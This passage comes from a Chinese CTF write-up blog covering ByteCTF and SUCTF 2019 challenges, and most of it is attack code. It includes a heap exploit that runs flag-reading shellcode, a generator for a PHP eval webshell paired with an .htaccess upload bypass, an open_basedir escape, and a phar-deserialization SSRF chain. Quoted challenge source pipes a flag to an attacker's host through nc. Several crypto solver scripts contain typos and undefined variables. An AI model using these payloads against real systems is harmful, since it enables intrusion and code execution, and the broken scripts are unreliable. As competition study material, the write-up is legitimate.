= ''py += 'a'*0x13 + p64(onegadget)malloc(0x68,py)ru(\"&gt;\")sl('C')ru(\"size&gt;\")sl('200')p.interactive() vip因为become vip函数中调用了prctl函数，而在输入名字处能溢出到v4，也就是prctl的第7个参数，溢出大小为0x30，所以可以构造沙箱规则将open函数关闭（顺便打开mprotect绕过NX），这样在edit函数中open(“/dev/urandom”, 0);返回值就为0，所以read(fd,a1,a2) == read(0,a1,a2) 就是用户输入了，然后这个函数没有对size进行检测所以存在任意长度的堆溢出，接下来就tcache了,但是因为execve函数被禁用了，所以这里用写shellcode直接读flag123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from pwn import *context(arch = 'amd64' , os = 'linux')context.terminal = ['tmux', 'splitw', '-h']context.log_level = \"debug\"p = process(\"./vip\")#p = remote(\"112.126.103.14\", 9999)ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b)slog = lambda x : log.success(x)flog = lambda x : log.success(x)libc = ELF(\"./libc-2.27.so\")def choose(idx): sla(\": \", str(idx))def alloc(idx): choose(1) sla(\": \", str(idx))def show(idx): choose(2) sla(\": \", str(idx))def free(idx): choose(3) sla(\": \", str(idx))def edit(idx, size, ctx): choose(4) sla(\": \", str(idx)) sla(\": \", str(size)) sa(\": \", ctx)def rule(code,jt ,jf ,k): return p16(code) + p8(jt) + p8(jf) + p32(k) #def build_rule():# payload = ''# payload+= rule(0x20 ,0x00, 0x00, 0x00000004) # A = arch# payload+= rule(0x15 ,0x00, 0x03, 0xc000003e) # if (A != ARCH_X86_64) goto 0010# payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = sys_number# payload+= rule(0x15 ,0x01, 0x00, 0x00000002) # if (A == open) goto 0006# payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) # return ALLOW# # payload+= rule(0x15 ,0x03, 0x00, 0x0000003b) # if (A == execve) goto 0005# payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2)# return payloaddef build_rule(): payload = '' payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = arch payload+= rule(0x15 ,0x07, 0x00, 0x00000001) # if (A == write) goto 0009 payload+= rule(0x15 ,0x06, 0x00, 0x00000000) # if (A == read) goto 0009 payload+= rule(0x15 ,0x05, 0x00, 0x0000000a) # if (A == mprotect) goto 0009 payload+= rule(0x15 ,0x04, 0x00, 0x40000002) # if (A == open) goto 0009 payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2) return payloadfor i in range(15): alloc(i)pay = \"a\"*0x20+build_size()print hex(len(pay))pause()choose(6)sa(\"name: \\n\", pay)p.interactive()edit(0, 0x70, \"a\"*0x50+p64(0)+p64(0x421))#gdb.attach(p)free(1)alloc(0)show(0)leak = ru(\"\\x7f\").ljust(8, \"\\x00\")leak = u64(leak)libc.address = leak-0x3ec090log.info(\"libc.address --&gt; %s\",hex(libc.address))alloc(0)alloc(1)free(6)free(7)free(8)free(9)free(0)edit(2, 16, p64(libc.symbols['__free_hook']))alloc(4)alloc(3)free(2)edit(4, 20, p64(0x404140))alloc(0)alloc(0)edit(3, 0x20, p64(libc.symbols['setcontext']+53))frame = SigreturnFrame()frame.rsp = 0x404150frame.rip = libc.symbols[\"mprotect\"]frame.rdx = 0x7frame.rsi = 0x1000frame.rdi = 0x404000payload = \"./flag\\x00\\x00\"payload += p64(0)payload += p64(0x404260) + p64(1) + p64(1)*32code = ''' mov rdi, 0x404140; mov rsi, 0; mov rdx, 0; mov eax, 0x40000002; syscall; mov rdi, 3; mov rsi, 0x404160; mov rdx, 100; mov eax, 0; syscall; mov rdi, 1; mov rsi, 0x404160; mov rdx, 100; mov eax, 1; syscall;'''payload += asm(code)edit(0, 0x1000, payload)edit(4, 0x300, str(frame))free(4)p.interactive() MISCbetgame试了几次，对应关系如下123第一关：b --&gt; s ; j --&gt; b ; s -- j ;第二关：j --&gt; s ; s --&gt; b ; b --&gt; j;第三关：s --&gt; s ; b --&gt; b ; j --&gt; j; 然后次数只需要30次菜鸡就直接手动出flag了2333 jigsaw按时间顺序头铁拼图…….. CRYPTOlrlraes随机数漏洞加广播攻击123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import gmpy2import libnumfrom Crypto.Util.number import long_to_bytes, bytes_to_long, getPrimefrom Crypto.Cipher import AESfrom randcrack import RandCrackimport randomdef GCRT(mi, ai): assert( isinstance (mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a ) in zip(mi[1:],ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura k = c // d *libnum.invmod(curm // d, m // d) cura += curm * k curm = curm * m // d cura %= curm return (cura %curm, curm)rc = RandCrack()r = []fd = open(\"old\",\"r\")out = fd.readline()while out: r.append(int(out.strip('\\n'),10)) out = fd.readline()# print rfor i in r[-624:]: rc.submit(i)for i in range(24): rc.predict_getrandbits(128)p = []for i in range(48): predict = rc.predict_getrandbits(128) p.append(predict)# print pfd = open(\"new\",\"r\")out = fd.readline()cn = []while out: cn.append(long_to_bytes(int(out.strip('\\n'),16)))# print out out = fd.readline()# print cnmn = []clist = []for i in range(24): key = long_to_bytes(p[24+i]) h = AES.new(key, AES.MODE_CBC, b\"\\x00\"*16) cnow = h.decrypt(cn[i]) key = long_to_bytes(p[i]) h = AES.new(key, AES.MODE_CBC, b\"\\x00\"*16) mnow = h.decrypt(cnow) mn.append(mnow)clist = list(map(bytes_to_long, mn))# print clistnlist = []fd = open(\"cl\",\"r\")out = fd.readline()while out: nlist.append(int(out.strip('\\n')[2:-1],16)) out = fd.readline()# print nlistm = GCRT(nlist, clist)[0]# print me = 17if gmpy2.iroot(m, e)[1] == 1: flag = gmpy2.iroot(m, e)[0] print flag# 61406796444626535559771097418338494728649815464609781204026855332620301752444 然后z3解方程123456789101112131415161718192021from z3 import *seed = BitVec(\"f\", 256+1)c = 0x10000000000000000000000000000000000000000000000000000000000000223m = 61406796444626535559771097418338494728649815464609781204026855332620301752444def calc(f): p = 0 for i in range(256-1, -1, -1): p = p * 2 p = If(Extract(i, i, f)==1, p^f, p) p = If(LShR(p, 256)==1, p^c, p) return psolver = Solver()solver.add(m==calc(seed))solver.add(Extract(256, 256, seed)==0)for i in range(7, 257, 8): solver.add(Extract(i, i, seed)==0)print(solver)if solver.check() == sat: print(solver.model())#flag&#123;very_simple_random_problem&#125; 还是太菜了Orz","comments":true,"permalink":"https://xi4or0uji.github.io/2019/09/11/2019-bytectf-wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 SUCTF wp","date":"2019-08-24T16:00:00.000Z","path":"2019/08/25/2019-SUCTF-wp/","text":"前段时间还在夏令营，今天终于有空补发一下当初打的很多的比赛了 WEBcheckin这道题一开始跑偏了，弄了很久.htaccess，最后幡然悔悟，nginx想用.htaccess要改配置文件鸭，网站文件菜鸡控制不了，最后找了一下别的方法，一个菜鸡没见过的东西.user.ini，最后就是绕过上传&amp;执行了1http://www.vuln.cn/6001 需要注意的就是他会检测文件内容不能包含&lt;?，所以上马的时候上script马，还有就是会检测文件头，加个GIF89a就行了 EasyPHP这道题直接给了源码1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[\"file\"]))&#123; $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die('One inch long, one inch strong!');&#125;if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");eval($hhh);?&gt; 可以看到这题有两个考点，一个是bypass执行eval，另一个是文件上传第一步的过滤很严，能用的字符不多，函数更是不能用了Orz后面的文件上传也很严格，文件后缀不能有ph，文件内容不能有&lt;?，文件类型要符合exif_imagetype先看第一步，剩下的可见字符能入手的估计也就是~和^，异或想去利用，一个字符至少得用六个字符去表示，加起来肯定是不够的，函数就更加执行不了了然后参考微笑师傅的博客，思路清奇所以接下来考虑变量，因为还有$，然后最短的变量就是$_GET，估计能18位搞定Orz一波操作以后能构造出12$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%d9&#125;();&amp;%d9=phpinfo#$_GET[0]&amp;0=phpinfo 无参的函数不多，因此第二步的利用就是要用他给的get_the_flag函数了第二步的考点估计后缀过滤得那么死，环境还是php7.2，估计得.htaccess，但是怎么满足exif_imagetype呢，这里就需要找一个文件，能同时满足图片和.htaccess文件的格式，而.htaccess文件的不解析符有#和\\x00，因此我们去找一下有没有什么图片头是有这些符号的然后这里有个xbm图片，格式如下12345#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;; 所以我们上传.htaccess文件如下123456#define width 1337 # Define the width wanted by the code (and say we are a legit xbitmap file lol)#define height 1337 # Define the heightAddType application/x-httpd-php .aaa # Say all file with extension .php16 will execute phpphp_value zend.multibyte 1 # Active specific encoding (you will see why after :D)php_value zend.detect_unicode 1 # Detect if the file have unicode contentphp_value display_errors 1 # Display php errors 这部分跟直接拿了l33t的脚本去改123456789101112131415161718SIZE_HEADER = b'\\n\\n#define width 1337\\n#define height 1337\\n\\n'def generate_php_file(filename, script): phpfile = open(filename, 'wb') phpfile.write(script.encode('utf-16be')) phpfile.write(SIZE_HEADER) phpfile.close()def generate_htaccess(): htaccess = open('..htaccess', 'wb') htaccess.write(SIZE_HEADER) htaccess.write(b'AddType application/x-httpd-php .aaa\\n') htaccess.write(b'php_value zend.multibyte 1\\n') htaccess.write(b'php_value zend.detect_unicode 1\\n') htaccess.write(b'php_value display_errors 1\\n') htaccess.close()generate_htaccess()generate_php_file(\"eval.aaa\", \"&lt;?php eval($_GET['cmd']); ?&gt;\") 上传过去又遇到open_basedir bypass，经典的bypass123456789&lt;?phpmkdir('/tmp/aaa/');chdir('/tmp/aaa/');ini_set('open_basedir'. '..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/flag')); easy_sql这道题菜鸡的解法是非预期…….. 因为运维人员在线vim的时候源码被我们扫到了，所以………1234567891011121314151617181920if(isset($post['query']))&#123; $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query'])); if(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query']))&#123; //echo $post['query']; die(\"Nonono.\"); &#125; if(strlen($post['query'])&gt;40)&#123; die(\"Too long.\"); &#125; $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; 然后看着源码做题很舒服Orz……（逃官方正解是11; set sql_mode=pipes_as_concat; select 1 学到了（逃 Pythonginx这题也是给了源码123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" 看了源码明显的服务器伪造&amp;文件读取，但是条件要符合有点困难，看到newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))这句去github搜了一下，有点惊喜1https://github.com/python-hyper/hyperlink/issues/19 然后就是利用了，因为题目提示nginx，所以直接读配置文件找flag赛后才知道是今年blackhat提到的，还是tcl顺便贴一个nginx配置目录，溜了 Upload Labs 2主办方依旧给了源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138//index.phpinclude 'class.php';$userdir = \"upload/\" . md5($_SERVER[\"REMOTE_ADDR\"]);if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true);&#125;if (isset($_POST[\"upload\"])) &#123; // 允许上传的图片后缀 $allowedExts = array(\"gif\", \"jpeg\", \"jpg\", \"png\"); $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $file_name = $_FILES[\"file\"][\"name\"]; $temp = explode(\".\", $file_name); $extension = end($temp); if ((($_FILES[\"file\"][\"type\"] == \"image/gif\") || ($_FILES[\"file\"][\"type\"] == \"image/jpeg\") || ($_FILES[\"file\"][\"type\"] == \"image/png\")) &amp;&amp; ($_FILES[\"file\"][\"size\"] &lt; 204800) // 小于 200 kb &amp;&amp; in_array($extension, $allowedExts) ) &#123; $c = new Check($tmp_name); $c-&gt;check(); if ($_FILES[\"file\"][\"error\"] &gt; 0) &#123; echo \"错误：: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br&gt;\"; die(); &#125; else &#123; move_uploaded_file($tmp_name, $userdir . \"/\" . md5($file_name) . \".\" . $extension); echo \"文件存储在: \" . $userdir . \"/\" . md5($file_name) . \".\" . $extension; &#125; &#125; else &#123; echo \"非法的文件格式\"; &#125; &#125;//func.phpinclude 'class.php';if (isset($_POST[\"submit\"]) &amp;&amp; isset($_POST[\"url\"])) &#123; if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i',$_POST['url']))&#123; die(\"Go away!\"); &#125;else&#123; $file_path = $_POST['url']; $file = new File($file_path); $file-&gt;getMIME(); echo \"&lt;p&gt;Your file type is '$file' &lt;/p&gt;\"; &#125;&#125;//class.phpinclude 'config.php';class File&#123; public $file_name; public $type; public $func = \"Check\"; function __construct($file_name)&#123; $this-&gt;file_name = $file_name; &#125; function __wakeup()&#123; $class = new ReflectionClass($this-&gt;func); $a = $class-&gt;newInstanceArgs($this-&gt;file_name); $a-&gt;check(); &#125; function getMIME()&#123; $finfo = finfo_open(FILEINFO_MIME_TYPE); //返回mine类型 $this-&gt;type = finfo_file($finfo, $this-&gt;file_name); finfo_close($finfo); &#125; function __toString()&#123; return $this-&gt;type; &#125;&#125;class Check&#123; public $file_name; function __construct($file_name)&#123; $this-&gt;file_name = $file_name; &#125; function check()&#123; $data = file_get_contents($this-&gt;file_name); if (mb_strpos($data, \"&lt;?\") !== FALSE) &#123; die(\"&amp;lt;? in contents!\"); &#125; &#125;&#125;//admin.phpinclude 'config.php';class Ad&#123; public $ip; public $port; public $clazz; public $func1; public $func2; public $func3; public $instance; public $arg1; public $arg2; public $arg3; function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123; $this-&gt;ip = $ip; $this-&gt;port = $port; $this-&gt;clazz = $clazz; $this-&gt;func1 = $func1; $this-&gt;func2 = $func2; $this-&gt;func3 = $func3; $this-&gt;arg1 = $arg1; $this-&gt;arg2 = $arg2; $this-&gt;arg3 = $arg3; &#125; function check()&#123; $reflect = new ReflectionClass($this-&gt;clazz); $this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2[0], $this-&gt;arg2[1], $this-&gt;arg2[2], $this-&gt;arg2[3], $this-&gt;arg2[4]); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); &#125; function __wakeup()&#123; system(\"/readflag | nc $this-&gt;ip $this-&gt;port\"); &#125;&#125;if($_SERVER['REMOTE_ADDR'] == '127.0.0.1')&#123; if(isset($_POST['admin']))&#123; $ip = $_POST['ip']; $port = $_POST['port']; $clazz = $_POST['clazz']; $func1 = $_POST['func1']; $func2 = $_POST['func2']; $func3 = $_POST['func3']; $arg1 = $_POST['arg1']; $arg2 = $_POST['arg2']; $arg2 = $_POST['arg3']; $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3); $admin-&gt;check(); &#125;&#125;else &#123; echo \"You r not admin!\";&#125; index.php里面上传文件会限制后缀、大小和文件内容，上传了以后func.php可以对文件进行查找，但是过滤得很严，跟过去getMine会看到有个finfo_file函数，利用它去触发反序列化，File类的__wakeup方法也很神奇，通过反射调用check函数，既然是反序列化怎么可能是用回原来的类的，看一下还剩的最后一个类，Ad类明显要ssrf，立刻就想到soap类，而soap类的__call方法则用File类的check去触发，最后Ad类的check触发用splstack::push，这步参考了delta的wp最后的问题，phar怎么触发呢，这里就是考的就是phar stream wrapper，File类的finfo_open与phar和php://filter有奇效,payload为php://filter/resource=phar://upload/af32ccd1c4bd937e0bd05fcf70528505/bb72f33959b3680b6d3656d5472a8f13.png 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass File&#123; public $file_name; public $type; public $func = 'SoapClient'; function __wakeup() &#123; $class = new ReflectionClass($this-&gt;func); $a = $class-&gt;newInstanceArgs($this-&gt;file_name); $a -&gt; check(); &#125; function __construct() &#123; $target = 'http://127.0.0.1/admin.php'; $post_string = 'admin=&amp;ip=x&amp;port=x&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123&amp;arg2=123&amp;arg3='; $this-&gt;file_name = [null, array(\"location\" =&gt; $target, \"user_agent\" =&gt; \"exp\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nCookie: profile=1\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string,\"uri\" =&gt; \"http://127.0.0.1/\")]; &#125; &#125;file_put_contents(\"test.txt\", \"test\");$e = new File();unlink(\"phar.phar\");$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub('&lt;script language=\"php\"&gt;__HALT_COMPILER();&lt;/script&gt;');$phar-&gt;setMetadata($e);$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;stopBuffering();rename(\"phar.phar\", \"phar.png\");unlink(\"test.txt\"); 这题出题人的思路也很巧妙，后面触发部分考察的是mysql client attack，而mysql在执行real_connect的时候会覆盖前面的mysqli-&gt;options12345678910111213$m = new mysqli();$m-&gt;init();$m-&gt;real_connect('ip','select 1','select 1','select 1',3306);$m-&gt;query('select 1;');$reflect = new ReflectionClass('Mysqli');$sql = $reflect-&gt;newInstanceArgs();$reflectionMethod = new ReflectionMethod('Mysqli', 'init');$reflectionMethod-&gt;invoke($sql, $arr);$reflectionMethod = new ReflectionMethod('Mysqli', 'real_connect');$reflectionMethod-&gt;invoke($sql, 'ip','root','123456','test','3306');$reflectionMethod = new ReflectionMethod('Mysqli', 'query');$reflectionMethod-&gt;invoke($sql, 'select 1'); mysqli-&gt;real_connect() overwrites MYSQLI_OPT_LOCAL_INFILE setting iCloudMusic这道题菜鸡只能跟着大佬的博客复现，还是太菜了（捂脸首先下下来一个压缩包，进入resources目录去解压app.asar文件（很奇怪，只能解压win32的压缩包，其他全损坏解压出来就是审计源码了，list.html里面music_info部分存在js注入然后就是利用process进行函数劫持触发函数https://github.com/imagemlt/iCloudMusic CRYPTOPrime给4个n和s，n之间还不互质，所以能求出4个因子，然后就是普通的rsa了，贴个脚本（溜12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import gmpy2import libnumimport hashlibimport binasciifrom Crypto.Util.number import long_to_bytesfrom pwn import *context.log_level = 'debug'p = remote(\"47.111.59.243\",\"8003\")p.recvuntil(\"str + \")s = p.recv(4)p.recvuntil(\"== \")md5s = p.recv(5)def md5(str): sha = hashlib.md5(str) e = sha.hexdigest() return efor i in range(10000000): if md5(str(i)+s)[0:5] == md5s: p.sendline(str(i)) breakp.interactive()p.recvuntil(\"cs[0] = \")cs0 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"ns[0] = \")ns0 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"cs[1] = \")cs1 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"ns[1] = \")ns1 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"cs[2] = \")cs2 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"ns[2] = \")ns2 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"cs[3] = \")cs3 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"ns[3] = \")ns3 = int(p.recvuntil('\\n').strip('\\n'),16)p.recvuntil(\"ms[0] = \")cs = []ns = []p01 = gmpy2.gcd(ns0, ns1)p02 - gmpy2.gcd(ns0, ns2)p03 = gmpy2.gcd(ns0, ns3)p04 = ns0 / p01 / p02 / p03d0 = int(gmpy2.invert(ns0, (p01 - 1)*(p02 - 1)*(p03 - 1)*(p04 - 1)))m1 = pow(cs0, d0, ns0)p11 = gmpy2.gcd(ns1, ns0)p12 = gmpy2.gcd(ns1, ns2)p13 = gmpy2.gcd(ns1, ns3)p14 = ns1 / p11 / p12 / p13d1 = int(gmpy2.invert(ns1, (p11 -1)*(p12 - 1)*(p13 - 1)*(p14 - 1)))m2 = pow(cs1, d1, ns1)p21 = gmpy2.gcd(ns2, ns0)p22 = gmpy2.gcd(ns2, ns1)p23 = gmpy2,gcd(ns2, ns3)p24 = ns2 / p20 / p21 / p22d2 = int(gmpy2.invert(ns2, (p21 - 1)*(p22 - 1)*(p23 - 1)*(p24 - 1)))m3 = pow(cs2, d2, ns2)p31 = gmpy2.gcd(ns3, ns0)p32 = gmpy2.gcd(ns3, ns1)p33 = gmpy2,gcd(ns3, ns2)p34 = ns3 / p30 / p31 / p32d3 = int(gmpy2.invert(ns3, (p31 - 1)*(p32 - 1)*(p33 - 1)*(p34 - 1)))m4 = pow(cs3, d3, nx3)p.sendline(str(hex(m1)))p.recvuntil(\"ms[1] = \")p.sendline(str(hex(m2)))p.recvuntil(\"ms[2] = \")p.sendline(str(hex(m3)))p.recvuntil(\"ms[3] = \")p.sendline(str(hex(m4)))p.interactive() RSA典型的lsb oracle attack，继续贴脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# -*- coding: utf-8 -*-#/usr/bin/env pythonimport requestsimport hashlibfrom pwn import *import libnumimport Cryptoimport refrom binascii import hexlify,unhexlifydef md5(str): sha = hashlib.md5(str) e = sha.hexdigest() return econtext.log_level = 'debug'p = remote(\"47.111.59.243\",9421)a = p.recvuntil(\")\")[-5:-1]print ab = p.recvuntil(\"\\n\")[-6:-1]print bmd5s = bfor i in range(10000000): if md5(str(i)+a)[0:5] == md5s: key = i breakp.recvuntil(\"&gt; \")p.sendline(str(key))def get_m(n,c,e): l = 0 r = n res = c e = e for i in range(20): print (l==r) if l == r: break p.recvuntil(\"Please input your option:\") p.sendline(\"D\") res = oracle(res, n, e) p.sendline(str(res)) p.recvuntil(\"The plain of your decrypted message is \") judge = p.recvuntil(\"!\")[:-1] if judge == \"odd\": l = (l + r) / 2 else: r = (l + r) / 2 print (l==r) return ldef send_msg(c): p.recvuntil(\"Please input your option:\") p.sendline(\"D\") p.sendline(str(c)) p.recvuntil(\"The plain of your decrypted message is \") judge = p.recvuntil(\"!\")[:-1] if judge == \"odd\": return 1 else: return 0def lsb_attack(n, e, c): i = 0 l, r, k = 0, 1, 1 while n * l // k + 1 &lt; n * r //k: m = l + r l *= 2 r *= 2 k *= 2 if send_msg(c * pow(k, e, n) % n) == 1: #odd l = m else: #even r = m m = n * l // k if pow(m, e, n) == c: return m m = n * r // k if pow(m, e, n) == c: return m return Nonedef test(): p.recvuntil(\"n = \") n = int(p.recvline()) p.recvuntil(\"e = \") e = int(p.recvline()) p.recvuntil(\"c = \") c = int(p.recvline()) key = lsb_attack(n, e, c) p.recvuntil(\"Please input your option:\") p.sendline(\"G\") p.sendline(str(key)) for i in range(3): key = 0 test() p.interactive() DSA因为有两个相同的r，所以我们可以爆破出符合条件的k，然后加密回去攻击1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#coding=utf8from Crypto.Hash import SHAfrom Crypto.Util.number import long_to_bytesfrom pwn import *from libnum import *context.log_level = 'debug'def inv(a, b): assert gcd(a % b, b) == 1 return xgcd(a % b, b)[0] % qdef decrypt(r, c1, c2, m1, m2, p, q, g, y): ds = c2 - c1 dm = (m2 - m1) % q k = dm * inv(ds, q) % q print \"[+]k-------&gt;\" + str(k) tmp = k * c1 - m1 x = tmp * inv(r, q) % q assert pow(g, x, p) == y return xdef sig(m, x, g, p, q): k = 151512 r = pow(g, k, p) % q c = (m + x * r) * inv(k, q) % q return (r, c)po = remote(\"47.111.59.243\", \"8001\")po.recvuntil(\"me?\")po.send(\"\\n\")po.recvuntil(\"p:\")p = int(po.recvuntil(\"\\n\").strip(\"\\n\"))po.recvuntil(\"q:\")q = int(po.recvuntil(\"\\n\").strip(\"\\n\"))po.recvuntil(\"g:\")g = int(po.recvuntil(\"\\n\").strip(\"\\n\"))po.recvuntil(\"y:\")y = int(po.recvuntil(\"\\n\").strip(\"\\n\"))md5 = []rr = []cc = []def getdata(): po.recvuntil(\"digest:\") m = po.recvuntil(\"(\")[1:-1] md5.append(m) n = po.recvuntil(\",\")[:-2] rr.append(n) k = po.recvuntil(\")\")[1:-2] cc.append(k) print \"md5---&gt;\" + m print \"rr---&gt;\" + n print \"cc---&gt;\" + k #po.recvuntil(\"before:\") po.send(\"\\n\")for i in range(12): getdata()po.recvuntil(\"digest is:\")l = po.recv(40)print \"md5---&gt;\" + lprint md5print rrprint ccj = 1for i in range(len(rr)): for j in range(j,len(rr)): if rr[i]==rr[j]: md51 = md5[i] md52 = md5[j] rr1 = rr[i] rr2 = rr[j] cc1 = cc[i] cc2 = cc[j] j = j + 1print \"md51---&gt;\" + md51print \"md52---&gt;\" + md52print \"rr1---&gt;\" + rr1print \"rr2---&gt;\" + rr2print \"cc1---&gt;\" + cc1print \"cc2---&gt;\" + cc2print \"md5555----&gt;\" + lx = decrypt(int(rr1), int(cc1), int(cc2), int(md51), int(md52), p, q, g, y)res = sig(int(l), x, g, p, q)print respo.interactive() MT这道题是队友做出来的，tqlconvert函数中移位跟与运算看似不可逆，但是每一步都亦或了自己，所以是可逆的，逆回去的基本思路就是根据移位补位上去的0为已知将一个数按二进制位分块，按块求解。比如第一步m = m ^ m &gt;&gt; 13 我们已知的只有亦或后的结果往下的几步运算也一样1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#coding:utf-8num = 0xaa21f3a2 #641460a9 e3953b1a aa21f3a2# 0xdc05c2a -&gt; 0xdc05d92# 0xd6166027 -&gt; 0xd6167ae5# num -&gt; res# m = m ^ m &gt;&gt; 19# 0x6e02前19# 0x1b8 前13# 0x1c2a末13# 验证通过a = num &gt;&gt; 13#前19bitb = num &gt;&gt; 19#前13bitc = num &amp; 0x1fff#亦或后的后13bitd = b ^c #后13bitres = (a &lt;&lt; 13) + d #第三轮结果 print \"third\"print hex(res)# 验证通过# 0x56526027 -&gt; 0xd6166027# second -&gt; thirda = res &amp; 0x1ffff #结果的低17位p = 0x85d40000b = (p &amp; 0xfffe0000)&gt;&gt;17 #取p的高15位c = (res &amp; 0xfffe0000)&gt;&gt;17 #取res的高15位d = (a &amp; b) ^ c #得到结果的高15位ans = (d &lt;&lt; 17) + a #第二轮结果 print \"second\"print hex(ans)# 验证通过# 0x6abb523f -&gt; 0x1a3b443f# second -&gt; firstp = 0x78f39600a = ans &amp; 0x1ff #结果的低9位# print \"低9位 --&gt; \" + hex(a)b = (p &gt;&gt; 9) &amp; 0x1ff #取p中间的9位# print \"中间9位 --&gt; \" + hex(b)c = (ans &gt;&gt; 9) &amp; 0x1ff# print \"second的中间9位 --&gt; \" + hex(c)d = (a &amp; b) ^ c #结果的中间9位# print \"结果的中间9位 --&gt; \" + hex(d)e = (p &gt;&gt; 18) &amp; 0x1ff #p的倒数第3个9位# print \"p的倒数第3个9位 --&gt; \" 